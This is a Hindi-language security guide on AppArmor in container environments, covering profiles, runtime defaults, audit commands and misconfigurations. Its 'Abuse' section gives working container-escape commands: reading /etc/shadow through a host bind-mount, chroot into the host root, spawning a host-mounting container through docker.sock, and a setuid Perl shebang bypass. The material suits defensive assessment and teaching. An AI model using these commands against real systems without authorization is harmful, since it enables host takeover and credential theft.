# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

AppArmor एक **Mandatory Access Control** सिस्टम है, जो प्रति-प्रोग्राम profiles के ज़रिए प्रतिबंध लागू करता है। पारंपरिक DAC checks उपयोगकर्ता और समूह के ownership पर बहुत अधिक निर्भर करते हैं, जबकि AppArmor kernel को process से जुड़ी policy लागू करने देता है। Container environments में यह महत्वपूर्ण है, क्योंकि किसी workload के पास कोई कार्रवाई करने की कोशिश करने के लिए पर्याप्त पारंपरिक privilege हो सकता है, फिर भी उसे रोका जा सकता है क्योंकि उसका AppArmor profile संबंधित path, mount, network behavior या capability के उपयोग की अनुमति नहीं देता।

सबसे महत्वपूर्ण वैचारिक बात यह है कि AppArmor **path-based** है। यह SELinux की तरह labels के बजाय path rules के माध्यम से filesystem access का आकलन करता है। इससे इसे समझना और इस्तेमाल करना आसान होता है, लेकिन इसका अर्थ यह भी है कि bind mounts और वैकल्पिक path layouts पर सावधानी से ध्यान देना चाहिए। यदि वही host content किसी दूसरे path के ज़रिए उपलब्ध हो जाए, तो policy का प्रभाव operator की शुरुआती अपेक्षा से अलग हो सकता है।

## Container Isolation में भूमिका

Container security reviews अक्सर capabilities और seccomp तक ही सीमित रहते हैं, लेकिन उन checks के बाद भी AppArmor महत्वपूर्ण रहता है। मान लें कि किसी container को ज़रूरत से ज़्यादा privilege मिला हुआ है, या किसी workload को operational कारणों से एक अतिरिक्त capability की आवश्यकता थी। AppArmor फिर भी file access, mount behavior, networking और execution patterns को सीमित कर सकता है, जिससे दुरुपयोग का स्पष्ट रास्ता रुक जाता है। इसी कारण, "application चलाने के लिए" AppArmor को disable करना चुपचाप एक जोखिमपूर्ण configuration को सक्रिय रूप से exploitable configuration में बदल सकता है।

## लैब

Host पर AppArmor सक्रिय है या नहीं, यह जाँचने के लिए इस्तेमाल करें:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

यह देखने के लिए कि वर्तमान कंटेनर प्रक्रिया किसके अंतर्गत चल रही है:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

यह अंतर महत्वपूर्ण है। सामान्य स्थिति में, प्रक्रिया को runtime द्वारा चुने गए profile से जुड़ा AppArmor context दिखाना चाहिए। unconfined स्थिति में, प्रतिबंध की यह अतिरिक्त परत हट जाती है।

आप यह भी जाँच सकते हैं कि Docker के अनुसार उसने क्या लागू किया है:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Runtime Usage

Docker, जब host इसका समर्थन करता है, तो डिफ़ॉल्ट या कस्टम AppArmor profile लागू कर सकता है। Podman भी AppArmor-आधारित systems पर AppArmor के साथ integrate हो सकता है, हालांकि SELinux-first distributions में अक्सर दूसरा MAC system प्रमुख भूमिका निभाता है। Kubernetes उन nodes पर workload स्तर पर AppArmor policy उपलब्ध करा सकता है जो वास्तव में AppArmor का समर्थन करते हैं। LXC और Ubuntu-family के संबंधित system-container environments भी AppArmor का व्यापक रूप से उपयोग करते हैं।

व्यावहारिक बात यह है कि AppArmor कोई "Docker feature" नहीं है। यह host-kernel का feature है, जिसे कई runtimes लागू कर सकते हैं। अगर host इसका समर्थन नहीं करता या runtime को unconfined चलाने के लिए कहा गया है, तो माना गया protection वास्तव में मौजूद नहीं है।

विशेष रूप से Kubernetes के लिए, आधुनिक API `securityContext.appArmorProfile` है। Kubernetes `v1.30` से पुराने beta AppArmor annotations deprecated हैं। समर्थित hosts पर, `RuntimeDefault` डिफ़ॉल्ट profile है, जबकि `Localhost` ऐसे profile की ओर संकेत करता है जिसे node पर पहले से load होना चाहिए। समीक्षा के दौरान यह बात महत्वपूर्ण है, क्योंकि कोई manifest AppArmor-aware दिख सकता है, जबकि वह पूरी तरह node-side support और पहले से load किए गए profiles पर निर्भर हो सकता है।<sup>[[1]](#references)</sup>

एक सूक्ष्म लेकिन उपयोगी operational detail यह है कि स्पष्ट रूप से `appArmorProfile.type: RuntimeDefault` सेट करना, field को छोड़ देने से अधिक सख्त है। अगर field स्पष्ट रूप से सेट है और node AppArmor का समर्थन नहीं करता, तो admission विफल होना चाहिए। अगर field छोड़ दिया गया है, तो workload AppArmor के बिना किसी node पर भी चल सकता है और उसे यह अतिरिक्त confinement layer नहीं मिलेगी। Attacker के नज़रिए से, यह manifest और वास्तविक node state—दोनों की जाँच करने का अच्छा कारण है।<sup>[[1]](#references)</sup>

AppArmor का समर्थन करने वाले Docker hosts पर सबसे प्रसिद्ध default `docker-default` है। यह profile Moby के AppArmor template से बनाया जाता है और यह समझने के लिए महत्वपूर्ण है कि capability-based कुछ PoCs default container में अब भी क्यों विफल होते हैं। मोटे तौर पर, `docker-default` सामान्य networking की अनुमति देता है, `/proc` के बड़े हिस्से में writes को deny करता है, `/sys` के संवेदनशील हिस्सों तक access को deny करता है, mount operations को block करता है और ptrace को इस तरह सीमित करता है कि वह host की जाँच करने का कोई सामान्य primitive न बन जाए। इस baseline को समझने से "container के पास `CAP_SYS_ADMIN` है" और "container वास्तव में kernel interfaces के विरुद्ध उस capability का उपयोग कर सकता है जिनमें मेरी दिलचस्पी है" के बीच अंतर पहचानने में मदद मिलती है।

## Profile Management

AppArmor profiles आम तौर पर `/etc/apparmor.d/` के अंतर्गत रखे जाते हैं। एक सामान्य naming convention में executable path के slashes को dots से बदल दिया जाता है। उदाहरण के लिए, `/usr/bin/man` का profile आम तौर पर `/etc/apparmor.d/usr.bin.man` में रखा जाता है। Defense और assessment—दोनों के दौरान यह बात महत्वपूर्ण है, क्योंकि active profile का नाम पता चलने पर अक्सर host पर उससे संबंधित file जल्दी ढूँढ़ी जा सकती है।

Host-side management के उपयोगी commands में शामिल हैं:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

कंटेनर-सुरक्षा संदर्भ में ये commands इसलिए महत्वपूर्ण हैं क्योंकि वे बताते हैं कि profiles वास्तव में कैसे बनाए जाते हैं, load किए जाते हैं, complain mode में बदले जाते हैं और application में बदलावों के बाद संशोधित किए जाते हैं। यदि किसी operator को troubleshooting के दौरान profiles को complain mode में डालने और enforcement बहाल करना भूल जाने की आदत है, तो दस्तावेज़ों में container सुरक्षित दिख सकता है, जबकि वास्तविकता में उसका व्यवहार कहीं अधिक ढीला हो सकता है।

### Profiles बनाना और अपडेट करना

`aa-genprof` application के व्यवहार को observe कर सकता है और interactively profile बनाने में मदद कर सकता है:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` एक टेम्पलेट प्रोफ़ाइल जनरेट कर सकता है, जिसे बाद में `apparmor_parser` के साथ लोड किया जा सकता है:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

जब binary बदलता है और policy को अपडेट करने की ज़रूरत होती है, तो `aa-logprof` लॉग में दर्ज अस्वीकृतियों को दोबारा चला सकता है और ऑपरेटर को उन्हें अनुमति देने या अस्वीकार करने का निर्णय लेने में मदद कर सकता है:

```bash
sudo aa-logprof
```

### Logs

AppArmor denials अक्सर `auditd`, syslog या `aa-notify` जैसे tools के ज़रिए दिखाई देते हैं:

```bash
sudo aa-notify -s 1 -v
```

यह operational और offensive, दोनों उद्देश्यों के लिए उपयोगी है। Defenders इसका उपयोग profiles को बेहतर बनाने के लिए करते हैं। Attackers इससे पता लगाते हैं कि किस सटीक path या operation को deny किया जा रहा है और क्या AppArmor exploit chain को रोकने वाला control है।

### सटीक Profile फ़ाइल की पहचान

जब कोई runtime किसी container के लिए AppArmor profile का विशिष्ट नाम दिखाता है, तो अक्सर उस नाम को डिस्क पर मौजूद profile फ़ाइल से जोड़ना उपयोगी होता है:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

यह host-side review के दौरान खास तौर पर उपयोगी है, क्योंकि यह “container कहता है कि वह `lowpriv` profile के तहत चल रहा है” और “वास्तविक rules इस खास file में हैं, जिसका audit या reload किया जा सकता है” के बीच की खाई को पाटता है।

### Audit करने के लिए High-Signal Rules

जब आप कोई profile पढ़ सकते हों, तो सिर्फ़ साधारण `deny` lines तक सीमित न रहें। कई rule types यह तय करने में बड़ा फर्क डालते हैं कि container escape attempt के विरुद्ध AppArmor कितना उपयोगी होगा:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: target binary को unconfined रूप में execute करता है। अगर कोई उपलब्ध helper, shell या interpreter `ux` के तहत allowed है, तो आमतौर पर सबसे पहले उसी को test करना चाहिए।
- `px` / `Px` और `cx` / `Cx`: exec पर profile transitions करते हैं। ये अपने-आप में बुरे नहीं हैं, लेकिन इनका audit करना ज़रूरी है, क्योंकि transition मौजूदा profile से कहीं अधिक व्यापक profile में ले जा सकता है।
- `change_profile`: किसी task को तुरंत या अगले exec पर किसी दूसरे loaded profile में switch करने देता है। अगर destination profile कमज़ोर है, तो यह restrictive domain से बाहर निकलने का इच्छित रास्ता बन सकता है।
- `flags=(complain)`, `flags=(unconfined)`, या नए `flags=(prompt)`: इनसे profile पर आपके भरोसे का स्तर बदलना चाहिए। `complain` denials को enforce करने के बजाय log करता है, `unconfined` boundary हटा देता है, और `prompt` शुद्ध kernel-enforced deny के बजाय userspace decision path पर निर्भर करता है।
- `userns` या `userns create,`: नए AppArmor policy में user namespaces के निर्माण को mediate किया जा सकता है। अगर कोई container profile इसकी स्पष्ट अनुमति देता है, तो nested user namespaces इस्तेमाल किए जा सकते हैं, भले ही platform अपनी hardening strategy के हिस्से के रूप में AppArmor का उपयोग करता हो।

उपयोगी host-side grep:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

इस तरह का audit अक्सर सैकड़ों सामान्य file rules को घूरने से ज़्यादा उपयोगी होता है। अगर किसी breakout के लिए helper execute करना, नया namespace दर्ज करना, या कम restrictive profile में escape करना ज़रूरी है, तो जवाब अक्सर इन स्पष्ट `deny /etc/shadow r` जैसी lines के बजाय transition-oriented rules में छिपा होता है।

## Misconfigurations

सबसे स्पष्ट गलती `apparmor=unconfined` है। Administrators अक्सर इसे तब set करते हैं, जब कोई application इसलिए fail हो जाती है क्योंकि profile ने किसी खतरनाक या अप्रत्याशित चीज़ को सही ढंग से block किया था। अगर यह flag production में बना रहता है, तो MAC layer प्रभावी रूप से पूरी तरह हटा दी जाती है।

एक और सूक्ष्म समस्या यह मान लेना है कि bind mounts हानिरहित हैं, क्योंकि file permissions सामान्य दिखती हैं। चूँकि AppArmor path-based है, इसलिए host paths को वैकल्पिक mount locations के अंतर्गत expose करने से path rules के साथ समस्याएँ हो सकती हैं। तीसरी गलती यह भूल जाना है कि config file में profile name का कोई खास अर्थ नहीं है, अगर host kernel वास्तव में AppArmor को enforce नहीं कर रहा है।

## Abuse

जब AppArmor हटा दिया जाता है, तो वे operations अचानक काम कर सकते हैं जिन पर पहले पाबंदी थी: bind mounts के ज़रिए sensitive paths पढ़ना, procfs या sysfs के उन हिस्सों तक पहुँचना जिन्हें इस्तेमाल करना कठिन होना चाहिए था, capabilities/seccomp भी अनुमति दें तो mount-संबंधी actions करना, या उन paths का उपयोग करना जिन्हें profile सामान्यतः deny करता। AppArmor अक्सर यह समझाता है कि capabilities पर आधारित breakout का प्रयास सिद्धांततः "काम करना चाहिए", लेकिन व्यवहार में फिर भी विफल क्यों होता है। AppArmor हटाएँ, और वही प्रयास सफल हो सकता है।

अगर आपको संदेह है कि path-traversal, bind-mount या mount-based abuse chain को रोकने वाली मुख्य चीज़ AppArmor है, तो पहला कदम आमतौर पर यह तुलना करना होता है कि profile के साथ और उसके बिना क्या-क्या accessible हो जाता है। उदाहरण के लिए, अगर कोई host path container के अंदर mount किया गया है, तो पहले जाँचें कि क्या आप उसमें आगे जा सकते हैं और उसे पढ़ सकते हैं:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

यदि container में `CAP_SYS_ADMIN` जैसी कोई खतरनाक capability भी है, तो सबसे व्यावहारिक परीक्षणों में से एक यह जांचना है कि क्या AppArmor वह नियंत्रण है जो mount operations या संवेदनशील kernel filesystems तक पहुंच को रोक रहा है:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

ऐसे environments में, जहाँ bind mount के ज़रिए host path पहले से उपलब्ध हो, AppArmor का हटना read-only information-disclosure issue को direct host file access में भी बदल सकता है:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

इन commands का उद्देश्य यह नहीं है कि केवल AppArmor ही breakout कराता है। बल्कि, AppArmor हटने के बाद filesystem और mount-आधारित दुरुपयोग के कई रास्तों को तुरंत परखा जा सकता है।

### पूरा उदाहरण: AppArmor अक्षम + Host Root माउंटेड

यदि container में host root पहले से ही `/host` पर bind-mounted है, तो AppArmor हटाने से filesystem के दुरुपयोग का एक अवरुद्ध रास्ता पूरी तरह host escape का रास्ता बन सकता है:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

जब shell host filesystem के ज़रिए execute होने लगता है, तो workload प्रभावी रूप से container boundary से बाहर निकल चुका होता है:

```bash
id
hostname
cat /etc/shadow | head
```

### पूरा उदाहरण: AppArmor अक्षम + Runtime Socket

अगर असली बाधा runtime state के आसपास AppArmor थी, तो पूरी तरह escape करने के लिए mounted socket पर्याप्त हो सकता है:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

सटीक path mount point पर निर्भर करता है, लेकिन अंतिम परिणाम एक जैसा है: AppArmor अब runtime API तक पहुँच को रोक नहीं रहा है, और runtime API ऐसा container लॉन्च कर सकता है जो host को compromise कर दे।

### पूरा उदाहरण: Path-Based Bind-Mount Bypass

चूँकि AppArmor path-based है, इसलिए `/proc/**` को सुरक्षित रखने से उसी host procfs content की सुरक्षा अपने-आप नहीं होती, जब वह किसी दूसरे path के ज़रिए उपलब्ध हो:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

प्रभाव इस बात पर निर्भर करता है कि वास्तव में क्या mount किया गया है और क्या वैकल्पिक path अन्य controls को भी bypass करता है, लेकिन यह पैटर्न उन सबसे स्पष्ट कारणों में से एक है जिनकी वजह से AppArmor का मूल्यांकन mount layout के साथ किया जाना चाहिए, न कि अलग से।

### पूरा उदाहरण: Shebang Bypass

AppArmor, shebang में दिए गए interpreter के बजाय निष्पादित script path से profile जोड़ सकता है। इसके विपरीत, interpreter को सीधे invoke करने पर उसका profile चुना जा सकता है। एक [AppArmor maintainer इस अंतर का वर्णन करता है](https://bugs.launchpad.net/apparmor/+bug/1911431)। एक ऐतिहासिक उदाहरण में ऐसी script शामिल थी जिसकी पहली पंक्ति एक confined interpreter की ओर संकेत करती है:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

यह उदाहरण केवल एक संभावित स्थिति है, जहाँ interpreter की file capability प्रभावी हो सकती है और script का वास्तविक exec attachment इस operation की अनुमति देता है। Loaded policy और process label, capability bounding set, `no_new_privs`, और mount की `nosuid` स्थिति जाँचें; केवल profile file name या `cap_setuid+ep` listing से यह साबित नहीं होता कि कोई उपयोगी transition संभव है। Interpreter chains और alternate execution paths की अलग से समीक्षा करें।

## Checks

इन checks का लक्ष्य तीन सवालों के तुरंत जवाब देना है: क्या host पर AppArmor enabled है, क्या मौजूदा process confined है, और क्या runtime ने वास्तव में इस container पर कोई profile लागू किया?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

यहाँ क्या ध्यान देने योग्य है:

- अगर `/proc/self/attr/current` में `unconfined` दिखता है, तो workload को AppArmor confinement का लाभ नहीं मिल रहा है।
- अगर `aa-status` में AppArmor disabled या loaded नहीं दिखता है, तो runtime config में दिया गया कोई भी profile name ज़्यादातर दिखावे के लिए है।
- अगर `docker inspect` में `unconfined` या कोई अप्रत्याशित custom profile दिखता है, तो अक्सर यही वजह होती है कि filesystem या mount-based abuse path काम करता है।
- अगर `/sys/kernel/security/apparmor/profiles` में वह profile मौजूद नहीं है जिसकी आपको उम्मीद थी, तो केवल runtime या orchestrator configuration पर्याप्त नहीं है।
- अगर किसी कथित hardened profile में `ux`, व्यापक `change_profile`, `userns`, या `flags=(complain)` जैसे rules हैं, तो व्यावहारिक boundary, profile name से जितनी मज़बूत लगती है, उससे कहीं कमज़ोर हो सकती है।

अगर किसी container को operational कारणों से पहले ही elevated privileges मिले हुए हैं, तो AppArmor enabled रखने से अक्सर एक controlled exception और कहीं अधिक व्यापक security failure के बीच फर्क पड़ता है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor-सक्षम hosts पर default रूप से enabled | जब तक override न किया जाए, `docker-default` AppArmor profile का उपयोग करता है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host पर निर्भर | `--security-opt` के ज़रिए AppArmor supported है, लेकिन सटीक default, host/runtime पर निर्भर करता है और Docker के दस्तावेज़ीकृत `docker-default` profile जितना सार्वभौमिक नहीं है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | अगर `appArmorProfile.type` निर्दिष्ट नहीं है, तो default `RuntimeDefault` होता है, लेकिन यह केवल तभी लागू होता है जब node पर AppArmor enabled हो | `securityContext.appArmorProfile.type: Unconfined`, कमज़ोर profile के साथ `securityContext.appArmorProfile.type: Localhost`, ऐसे nodes जिनमें AppArmor support नहीं है |
| containerd / CRI-O under Kubernetes | Node/runtime support के अनुसार | Kubernetes द्वारा समर्थित आम runtimes AppArmor को support करते हैं, लेकिन वास्तविक enforcement फिर भी node support और workload settings पर निर्भर करता है | Kubernetes वाली row के समान; direct runtime configuration भी AppArmor को पूरी तरह छोड़ सकती है |

AppArmor के लिए, सबसे महत्वपूर्ण variable अक्सर **host** होता है, केवल runtime नहीं। किसी manifest में profile setting से ऐसे node पर confinement लागू नहीं होता जहाँ AppArmor enabled न हो।

## References

- [1] [Kubernetes security context: AppArmor profile fields और node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, और profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
